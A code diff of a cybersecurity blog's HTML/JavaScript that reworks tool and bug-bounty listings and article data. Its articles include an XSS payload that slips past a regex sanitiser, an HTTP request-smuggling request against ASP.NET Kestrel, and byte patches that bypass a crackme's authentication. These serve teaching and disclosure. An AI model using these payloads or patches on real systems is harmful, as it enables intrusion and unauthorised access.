-<p>With the username cracked, we need the password. Look at the <code>check_password</code> function. Using <code>pdf</code> on it reveals how the password is compared. Typically these crackmes either compare against an embedded constant or hash the input and compare hashes.</p>
-
-<p>Scan for embedded strings first:</p>
-
-<pre data-lang="bash"><code><span class="g">izz</span></code></pre>
-
-<p>This lists all strings in the binary. Look for anything password-like — a phrase, a hex-encoded sequence, or a suspicious-looking constant.</p>
-
-<h2>Patching the Binary</h2>
-<p>The final part of the challenge is to modify the executable so it triggers a normally inaccessible code path. To patch in Radare2, enable write mode:</p>
-
-<pre data-lang="bash"><code><span class="g">oo+</span></code></pre>
-
-<p>Navigate to the instruction you want to change. For example, if you want to force <code>check_username</code> to always return success, find the jump instruction after the comparison and change it to a <code>NOP</code> (no operation):</p>
-
-<pre data-lang="assembly"><code><span class="c">; Before (jump on not-equal)</span>
-0x00001654  test eax, eax
-0x00001656  jne 0x1680
-
-<span class="c">; After (always fall through)</span>
-0x00001656  90 90   ; NOP NOP</code></pre>
-
-<p>In Radare2, seek to the instruction and write the NOP bytes:</p>
-
-<pre data-lang="bash"><code><span class="g">s</span> <span class="w">0x1656</span>
-<span class="g">wx</span> <span class="w">9090</span></code></pre>
-
-<p>Or, to be more surgical, invert the condition. The <code>jne</code> opcode is <code>75</code>, and <code>je</code> is <code>74</code>. Change <code>75</code> to <code>74</code>:</p>
-
-<pre data-lang="bash"><code><span class="g">s</span> <span class="w">0x1656</span>
-<span class="g">wx</span> <span class="w">74</span></code></pre>
-
-<p>Verify with <code>pd 5</code> (print 5 disassembled instructions) that the change applied, then write the patched binary to disk:</p>
-
-<pre data-lang="bash"><code><span class="g">wtf</span> <span class="w">patched_binary</span></code></pre>
-
-<h2>Testing the Patch</h2>
-<p>Run the patched binary and connect with netcat:</p>
-
-<pre data-lang="bash"><code><span class="g">./patched_binary</span>
-<span class="c"># In another terminal:</span>
-<span class="g">nc</span> <span class="w">localhost 14884</span></code></pre>
-
-<p>Now enter any username. Because we bypassed the comparison, the program grants access without checking. You've successfully patched the binary to bypass authentication.</p>
-
-<h2>Key Takeaways</h2>
-<ul>
-  <li><strong>Radare2 is a full RE framework.</strong> <code>pdf</code> for disassembly, <code>izz</code> for strings, <code>wx</code> for patching, <code>wtf</code> for writing the modified binary.</li>
-  <li><strong>Stack variable sizing.</strong> Subtract adjacent variable addresses to determine buffer sizes.</li>
-  <li><strong>Immediate value inspection.</strong> Use <code>?</code> to convert hex constants into their string interpretation — Radare2 does it for you.</li>
-  <li><strong>Patch, don't just read.</strong> Reverse engineering doesn't stop at static analysis. Patching demonstrates understanding.</li>
-  <li><strong>Compare opcodes.</strong> <code>jne</code> = 0x75, <code>je</code> = 0x74, <code>NOP</code> = 0x90. Memorise these for quick patching.</li>
-</ul>
-
-<h2>Practice Resources</h2>
-<ul>
-  <li><strong>crackmes.one</strong> — Massive collection of legal reverse-engineering challenges</li>
-  <li><strong>Radare2 book</strong> — <a href="https://book.rada.re" target="_blank" rel="noopener">book.rada.re</a></li>
-  <li><strong>Nightmare</strong> — <a href="https://guyinatuxedo.github.io" target="_blank" rel="noopener">guyinatuxedo.github.io</a> — excellent beginner RE course</li>
-  <li><strong>Malware Unicorn workshops</strong> — free RE workshops with sample binaries</li>
-</ul>
-
-<div class="callout warn">
-  <div class="callout-title"><i class="fas fa-triangle-exclamation"></i> Ethical Reminder</div>
-  <p>Reverse engineering is legal on binaries you own or are licensed to analyse. Always check software EULAs and local laws — reverse engineering can breach license agreements in some jurisdictions.</p>
-</div>
-
-<div class="tag-row">
-  <span class="bb-tag">Reverse Engineering</span><span class="bb-tag">Radare2</span><span class="bb-tag">Binary Patching</span>
-  <span class="bb-tag">Crackme</span><span class="bb-tag">Disassembly</span><span class="bb-tag">Linux</span>
-</div>`
-  },
-];
-
-/* ═══ WRITEUPS DATA ═══ */
-const WRITEUPS = [
-  {title:'TryHackMe — Blue', diff:'easy', plat:'thm', icon:'fa-windows', desc:'EternalBlue exploit on Windows 7. MS17-010 SMB vulnerability, Meterpreter, privilege escalation.', tags:['SMB','EternalBlue','MS17-010']},
-  {title:'TryHackMe — Kenobi', diff:'easy', plat:'thm', icon:'fa-server', desc:'Samba enumeration, ProFTPD exploit, NFS mount, SSH key extraction and privilege escalation.', tags:['SMB','ProFTPD','NFS']},
-  {title:'HTB — Lame', diff:'easy', plat:'htb', icon:'fa-terminal', desc:'Classic beginner box. Samba 3.0.20 exploit (CVE-2007-2447), command injection to root.', tags:['Samba','CVE','Root']},
-  {title:'HTB — Legacy', diff:'easy', plat:'htb', icon:'fa-desktop', desc:'Windows XP box. MS08-067 SMB exploit via Metasploit. Perfect for beginners.', tags:['Windows','MS08-067','SMB']},
-  {title:'TryHackMe — Pickle Rick', diff:'easy', plat:'thm', icon:'fa-dill', desc:'Web-based CTF. Source code inspection, command injection via base64, privilege escalation.', tags:['Web','RCE','Linux']},
-  {title:'HTB — Devel', diff:'easy', plat:'htb', icon:'fa-code', desc:'FTP anonymous upload, aspx reverse shell, JuicyPotato privilege escalation.', tags:['FTP','ASPX','JuicyPotato']},
-  {title:'TryHackMe — Alfred', diff:'medium', plat:'thm', icon:'fa-robot', desc:'Jenkins exploitation, PowerShell reverse shell, Metasploit token impersonation.', tags:['Jenkins','PowerShell','Windows']},
-  {title:'HTB — Optimum', diff:'easy', plat:'htb', icon:'fa-windows', desc:'Rejetto HFS exploitation, Windows privilege escalation via Sherlock.', tags:['HFS','PrivEsc','Windows']},
-  {title:'TryHackMe — VulnNet', diff:'medium', plat:'thm', icon:'fa-shield', desc:'Multiple vulnerabilities chained. LFI, backup files, SSRF and internal service access.', tags:['LFI','SSRF','Chaining']},
-  {title:'HTB — Bashed', diff:'easy', plat:'htb', icon:'fa-skull', desc:'Web shell discovery, www-data shell, sudo misconfiguration to root.', tags:['Web Shell','Sudo','Linux']},
-  {title:'TryHackMe — RootMe', diff:'easy', plat:'thm', icon:'fa-user-secret', desc:'File upload bypass, PHP reverse shell, SUID binary privilege escalation.', tags:['Upload','SUID','PHP']},
-  {title:'HTB — Nibbles', diff:'easy', plat:'htb', icon:'fa-cube', desc:'Nibbleblog CMS exploitation, CVE-2015-6967 file upload to RCE.', tags:['CMS','CVE','RCE']},
-];
-
-/* ═══ TOOLS DATA ═══ */
 const TOOLS = [
   {n:'Nmap', c:'recon', i:'fa-radar', d:'Network mapper — port scanning, service detection, OS fingerprinting.', l:'https://nmap.org'},
   {n:'Masscan', c:'recon', i:'fa-bolt', d:'Fastest port scanner. Scans entire internet in minutes.', l:'https://github.com/robertdavidgraham/masscan'},
@@ -1746,6 +1269,59 @@ const CATS = [
   {id:'report', name:'Reporting', icon:'fa-file-pen'},
 ];
 
+let currentCat = 'all';
+let currentToolSearch = '';
+
+function renderCats(){
+  $('toolCats').innerHTML = CATS.map(c=>`
+    <button class="tcat ${c.id==='all'?'on':''}" data-cat="${c.id}">
+      <i class="fas ${c.icon}"></i> ${c.name}
+    </button>`).join('');
+  $('toolCats').querySelectorAll('.tcat').forEach(btn=>{
+    btn.addEventListener('click', ()=>{
+      $('toolCats').querySelectorAll('.tcat').forEach(b=>b.classList.remove('on'));
+      btn.classList.add('on');
+      currentCat = btn.dataset.cat;
+      renderTools();
+    });
+  });
+}
+
+function renderTools(){
+  const q = currentToolSearch.toLowerCase().trim();
+  const list = TOOLS.filter(t=>{
+    const catMatch = currentCat === 'all' || t.c === currentCat;
+    const searchMatch = !q || t.n.toLowerCase().includes(q) || t.d.toLowerCase().includes(q);
+    return catMatch && searchMatch;
+  });
+  $('toolCount').textContent = list.length + ' tools';
+  if (!list.length){
+    $('toolGrid').innerHTML = `<div class="news-empty" style="grid-column:1/-1"><i class="fas fa-search"></i><h3>No tools found</h3><p>Try a different search</p></div>`;
+    return;
+  }
+  $('toolGrid').innerHTML = list.map(t=>{
+    const cat = CATS.find(c=>c.id===t.c)?.name || t.c;
+    return `
+      <a class="tool" href="${t.l}" target="_blank" rel="noopener">
+        <i class="fas fa-arrow-up-right-from-square tool-arrow"></i>
+        <div class="tool-head">
+          <div class="tool-ico"><i class="fas ${t.i}"></i></div>
+          <div>
+            <div class="tool-name">${t.n}</div>
+            <div class="tool-cat-tag">${cat}</div>
+          </div>
+        </div>
+        <p>${t.d}</p>
+      </a>`;
+  }).join('');
+}
+
+$('toolSearch').addEventListener('input', (e)=>{
+  currentToolSearch = e.target.value;
+  renderTools();
+});
+
+/* ═══ BUG BOUNTY DATA ═══ */
 const BB = [
   {i:'fa-globe', t:'Recon Automation Pipeline', d:'Build a subdomain → probe → screenshot → nuclei pipeline that runs automatically every morning.', tags:['Recon','Automation','Nuclei']},
   {i:'fa-code-branch', t:'XSS to Account Takeover', d:'Chain stored XSS with weak session handling to fully take over a user account.', tags:['XSS','ATO','Chaining']},
@@ -1758,7 +1334,112 @@ const BB = [
   {i:'fa-graphql', t:'GraphQL Introspection Abuse', d:'Enabling introspection, finding hidden queries/mutations, and abusing mass assignment.', tags:['GraphQL','API','Introspection']},
 ];
 
-/* ═══ RENDER ARTICLES ═══ */
+function renderBB(){
+  $('bbGrid').innerHTML = BB.map(b=>`
+    <article class="bb rv">
+      <div class="bb-ico"><i class="fas ${b.i}"></i></div>
+      <h3>${b.t}</h3>
+      <p>${b.d}</p>
+      <div class="bb-tags">${b.tags.map(t=>`<span class="bb-tag">${t}</span>`).join('')}</div>
+    </article>`).join('');
+}
+
+/* ═══ ARTICLES — KEPT (real content) ═══ */
+const ARTICLES = [
+  {
+    id:'regexss-bug-bounty',
+    n:'01',
+    t:'REGEXSS: How a Greedy Regex Turned Into $20K+ in Bug Bounties',
+    d:'Overly-greedy regex replacements breaking HTML sanitisation → unauthenticated XSS. Real bug bounty story with live methodology.',
+    tags:['Bug Bounty','XSS','Regex'],
+    time:'16 min',
+    content:`<h1>REGEXSS: How a Greedy Regex Turned Into $20K+ in Bug Bounties</h1>
+<div class="article-meta"><span><i class="fas fa-bug"></i> Bug Bounty</span><span><i class="fas fa-dollar-sign"></i> $20K+ earned</span><span><i class="fas fa-clock"></i> 16 min read</span></div>
+<p>A class of bugs called <strong>REGEXSS</strong> — XSS that sneaks in through an overly-greedy regex — is generating serious bounty money. I've personally pulled in over <strong>$20,000</strong> from this one bug class.</p>
+<h2>What Is Regex, Really?</h2>
+<p>If regex has always looked scary, you're not alone. Resources that make regex less intimidating: <a href="https://regexr.com" target="_blank" rel="noopener">Regexr</a>, <a href="https://regexcrossword.com" target="_blank" rel="noopener">Regex Crossword</a>.</p>
+<h2>Classic Regex Mistakes That Cause Vulnerabilities</h2>
+<ul><li><strong>Using <code>.</code> instead of <code>\.</code></strong> — allowlist bypass.</li><li><strong>Forgetting anchors</strong> — "admin" also matches "notadminlol".</li><li><strong>Writing <code>[A-z]</code></strong> — actually includes <code>[ \ ] ^ _ \`</code>.</li><li><strong>ReDoS</strong> — catastrophic backtracking.</li></ul>
+<h2>The Vulnerability Pattern</h2>
+<pre data-lang="javascript"><code>content.replace(/attribute=".*?"/g, '')</code></pre>
+<p>The intent is to remove HTML attributes. But greedy quantifiers can cross attribute boundaries.</p>
+<h2>The Bypass — Shifting Boundaries</h2>
+<pre data-lang="html"><code>&lt;a href="attribute=" title="javascript:alert('xss')"&gt;test&lt;/a&gt;</code></pre>
+<p>After the sanitizer runs, the <code>href</code> value becomes a JavaScript URL. Classic XSS.</p>
+<h2>Real-World Case Study</h2>
+<p>The vulnerable code sat inside a popular WordPress plugin that generated structured data. The plugin ran <code>preg_replace('/itemprop=".*?"/', '', $review)</code> — and when a review contained crafted markup, the sanitizer stripped the wrong segment.</p>
+<h2>How to Find REGEXSS Bugs</h2>
+<ol><li>Grep for <code>replace</code>, <code>preg_replace</code>, <code>gsub</code>.</li><li>Look for HTML sanitisation with regex.</li><li>Craft boundary-shifting payloads.</li><li>Test with JavaScript URLs.</li><li>Check for storage (reflected → stored).</li></ol>
+<h2>Takeaways</h2>
+<ul><li>Regex can never sanitise HTML safely. Use DOMPurify.</li><li>Greedy quantifiers inside quote delimiters are a red flag.</li><li>Report responsibly through official bug bounty programs.</li></ul>
+<div class="callout"><div class="callout-title"><i class="fas fa-lightbulb"></i> Resources</div><p>Read the full technical writeup at <a href="https://sec.stealthcopter.com/regexss/" target="_blank" rel="noopener">sec.stealthcopter.com/regexss</a></p></div>`
+  },
+  {
+    id:'aspnet-smuggling',
+    n:'02',
+    t:'How I Found the Worst ASP.NET Vulnerability — $10K Bug (CVE-2025-55315)',
+    d:'HTTP request smuggling via malformed chunked extensions in ASP.NET Core Kestrel. CVSS 9.9 — the highest ever for ASP.NET.',
+    tags:['Bug Bounty','ASP.NET','Smuggling'],
+    time:'20 min',
+    content:`<h1>How I Found the Worst ASP.NET Vulnerability — $10K Bug (CVE-2025-55315)</h1>
+<div class="article-meta"><span><i class="fas fa-bug"></i> Bug Bounty</span><span><i class="fas fa-dollar-sign"></i> $10,000 bounty</span><span><i class="fas fa-clock"></i> 20 min read</span></div>
+<p>I earned a <strong>$10,000 bounty from Microsoft</strong> after discovering a critical HTTP request smuggling vulnerability in ASP.NET Core's Kestrel server — tracked as <strong>CVE-2025-55315</strong>, CVSS 9.9.</p>
+<h2>Request Smuggling Recap</h2>
+<p>HTTP request smuggling exploits ambiguities in how front-end and back-end systems determine where one HTTP request ends and the next begins.</p>
+<h2>Funky Chunks — The Research That Started It</h2>
+<p>My journey started with Jeppe's research on request smuggling via <strong>chunked transfer encoding extensions</strong>.</p>
+<h2>Discovery — Testing Kestrel</h2>
+<pre data-lang="http"><code>POST /one HTTP/1.1
+Host: victim
+Transfer-Encoding: chunked
+
+2;xx\nxx
+xy
+0
+
+GET /admin HTTP/1.1
+Host: victim
+Content-Length: 5
+
+x</code></pre>
+<h2>Why This Creates Smuggling — TERM.EXT</h2>
+<p>The front-end proxy interprets <code>\n</code> as a line terminator; Kestrel treats it as part of the chunk extension. Two different interpretations = smuggling.</p>
+<h2>Source Code Analysis</h2>
+<p>The bug was in <code>ParseExtension</code> of <code>Http1ChunkedEncodingMessageBody</code>.</p>
+<h2>Understanding the 9.9 CVSS Score</h2>
+<p>CVSS was designed for singular systems, not reusable components. The high severity rating was primarily about <strong>signalling urgency to downstream users</strong>.</p>
+<h2>What Bounty Hunters Can Learn</h2>
+<ul><li>Read RFCs carefully.</li><li>Study prior research.</li><li>Test library code, not just apps.</li><li>Set up minimal reproductions.</li><li>Contribute back.</li></ul>
+<div class="callout"><div class="callout-title"><i class="fas fa-lightbulb"></i> Read the Original</div><p><a href="https://www.praetorian.com/blog/how-i-found-the-worst-asp-net-vulnerability-a-10k-bug-cve-2025-55315/" target="_blank" rel="noopener">Praetorian Blog</a></p></div>`
+  },
+  {
+    id:'radare2-reversing',
+    n:'03',
+    t:'Reverse Engineering & Patching Executables with Radare2',
+    d:'Extract a hidden password from a binary, patch the executable, and bypass authentication using Radare2 on Debian Linux.',
+    tags:['Reverse Engineering','Radare2','Patching'],
+    time:'24 min',
+    content:`<h1>Reverse Engineering & Patching Executables with Radare2</h1>
+<div class="article-meta"><span><i class="fas fa-microchip"></i> Reverse Engineering</span><span><i class="fas fa-clock"></i> 24 min read</span></div>
+<p>Use <strong>Radare2</strong> to uncover a password hidden inside a binary, then patch the executable to bypass authentication.</p>
+<h2>Setting Up</h2>
+<pre data-lang="bash"><code>git clone https://github.com/radareorg/radare2
+cd radare2
+sys/install.sh</code></pre>
+<h2>Username Recognition</h2>
+<pre data-lang="bash"><code>pdf @ sym.check_username</code></pre>
+<pre data-lang="assembly"><code>mov dword [var_420h], 0x6262616a ; 'jabb'</code></pre>
+<p>Radare2 decodes the hex to <code>jabb</code>. Continuing, we get <strong>jabba</strong> as the username.</p>
+<h2>Patching the Binary</h2>
+<pre data-lang="bash"><code>oo+
+s 0x1656
+wx 74</code></pre>
+<p>Changing <code>jne</code> (0x75) to <code>je</code> (0x74) inverts the condition. Save with <code>wtf patched_binary</code>.</p>
+<h2>Key Takeaways</h2>
+<ul><li>Radare2 is a full RE framework: <code>pdf</code>, <code>izz</code>, <code>wx</code>, <code>wtf</code>.</li><li>Stack variable sizing = subtract adjacent addresses.</li><li>Opcode knowledge: <code>jne</code>=0x75, <code>je</code>=0x74, <code>NOP</code>=0x90.</li></ul>`
+  },
+];
+
 function renderArticles(){
   $('artGrid').innerHTML = ARTICLES.map(a=>`
     <article class="art rv" data-id="${a.id}">
@@ -1790,114 +1471,26 @@ function openArticle(id){
   reader.classList.add('on');
   document.body.classList.add('locked');
   readerBody.scrollTop = 0;
-  updateReaderProgress();
 }
-
 function closeArticle(){
   reader.classList.remove('on');
   document.body.classList.remove('locked');
 }
-
 $('readerBack').addEventListener('click', closeArticle);
 document.addEventListener('keydown', (e)=>{
   if (e.key === 'Escape' && reader.classList.contains('on')) closeArticle();
 });
-
-function updateReaderProgress(){
+readerBody.addEventListener('scroll', ()=>{
   const max = readerBody.scrollHeight - readerBody.clientHeight;
   const pct = max > 0 ? (readerBody.scrollTop / max) * 100 : 0;
   $('readerProgress').style.width = pct + '%';
-}
-readerBody.addEventListener('scroll', updateReaderProgress, {passive:true});
-
-/* ═══ RENDER WRITEUPS ═══ */
-function renderWriteups(){
-  $('writeupGrid').innerHTML = WRITEUPS.map(w=>{
-    const badge = `<span class="badge ${w.diff}">${w.diff}</span><span class="badge ${w.plat}">${w.plat.toUpperCase()}</span>`;
-    const tags = w.tags.map(t=>`<span class="bb-tag">${t}</span>`).join('');
-    return `
-      <article class="wcard rv">
-        <div class="wcard-img">
-          <i class="fas ${w.icon}"></i>
-          <div class="wcard-badges">${badge}</div>
-        </div>
-        <div class="wcard-body">
-          <h3>${w.title}</h3>
-          <p>${w.desc}</p>
-          <div class="bb-tags" style="margin-bottom:12px">${tags}</div>
-          <div class="wcard-meta">
-            <span><i class="fas fa-terminal"></i> Read full writeup</span>
-            <i class="fas fa-arrow-right"></i>
-          </div>
-        </div>
-      </article>`;
-  }).join('');
-}
-
-/* ═══ RENDER TOOLS ═══ */
-let currentCat = 'all';
-let currentSearch = '';
-
-function renderCats(){
-  $('toolCats').innerHTML = CATS.map(c=>`
-    <button class="tcat ${c.id==='all'?'on':''}" data-cat="${c.id}">
-      <i class="fas ${c.icon}"></i> ${c.name}
-    </button>`).join('');
-  $('toolCats').querySelectorAll('.tcat').forEach(btn=>{
-    btn.addEventListener('click', ()=>{
-      $('toolCats').querySelectorAll('.tcat').forEach(b=>b.classList.remove('on'));
-      btn.classList.add('on');
-      currentCat = btn.dataset.cat;
-      renderTools();
-    });
-  });
-}
-
-function renderTools(){
-  const q = currentSearch.toLowerCase().trim();
-  let list = TOOLS.filter(t=>{
-    const catMatch = currentCat === 'all' || t.c === currentCat;
-    const searchMatch = !q || t.n.toLowerCase().includes(q) || t.d.toLowerCase().includes(q);
-    return catMatch && searchMatch;
-  });
-  $('toolCount').textContent = list.length + ' tools';
-  if (!list.length){
-    $('toolGrid').innerHTML = `<div class="tool-empty"><i class="fas fa-search" style="font-size:2rem;color:var(--muted2);display:block;margin-bottom:12px"></i>No tools found. Try a different search.</div>`;
-    return;
-  }
-  $('toolGrid').innerHTML = list.map(t=>{
-    const cat = CATS.find(c=>c.id===t.c)?.name || t.c;
-    return `
-      <a class="tool" href="${t.l}" target="_blank" rel="noopener">
-        <i class="fas fa-arrow-up-right-from-square tool-arrow"></i>
-        <div class="tool-head">
-          <div class="tool-ico"><i class="fas ${t.i}"></i></div>
-          <div>
-            <div class="tool-name">${t.n}</div>
-            <div class="tool-cat-tag">${cat}</div>
-          </div>
-        </div>
-        <p>${t.d}</p>
-      </a>`;
-  }).join('');
-}
-
-function renderBB(){
-  $('bbGrid').innerHTML = BB.map(b=>`
-    <article class="bb rv">
-      <div class="bb-ico"><i class="fas ${b.i}"></i></div>
-      <h3>${b.t}</h3>
-      <p>${b.d}</p>
-      <div class="bb-tags">${b.tags.map(t=>`<span class="bb-tag">${t}</span>`).join('')}</div>
-    </article>`).join('');
-}
+}, {passive:true});
 
 /* ═══ REVEAL ═══ */
 const io = new IntersectionObserver(es=>es.forEach(e=>{
   if (e.isIntersecting){ e.target.classList.add('in'); io.unobserve(e.target); }
 }), {threshold:.08, rootMargin:'0px 0px -40px 0px'});
-
-function observeAll(){ document.querySelectorAll('.rv').forEach(el=>io.observe(el)); }
+document.querySelectorAll('.rv').forEach(el=>io.observe(el));
 
 /* ═══ COUNTERS ═══ */
 function animateCounters(){
@@ -1912,27 +1505,24 @@ function animateCounters(){
     }, 25);
   });
 }
-
 const statsIO = new IntersectionObserver(es=>es.forEach(e=>{
   if (e.isIntersecting){ animateCounters(); statsIO.disconnect(); }
 }), {threshold:.5});
 statsIO.observe(document.querySelector('.stats'));
 
-/* ═══ SEARCH ═══ */
-$('toolSearch').addEventListener('input', (e)=>{
-  currentSearch = e.target.value;
-  renderTools();
-});
-
+/* ═══ SCROLL TOP ═══ */
 $('toTop').addEventListener('click', ()=>window.scrollTo({top:0,behavior:'smooth'}));
 
+/* ═══ AUTO-REFRESH NEWS EVERY 5 MIN ═══ */
+setInterval(()=>{
+  loadAllNews(true);
+}, 5 * 60 * 1000);
+
 /* ═══ INIT ═══ */
-renderArticles();
-renderWriteups();
-renderCats();
 renderTools();
 renderBB();
-observeAll();
+renderArticles();
+loadAllNews(false);
 </script>
 </body>
 </html>
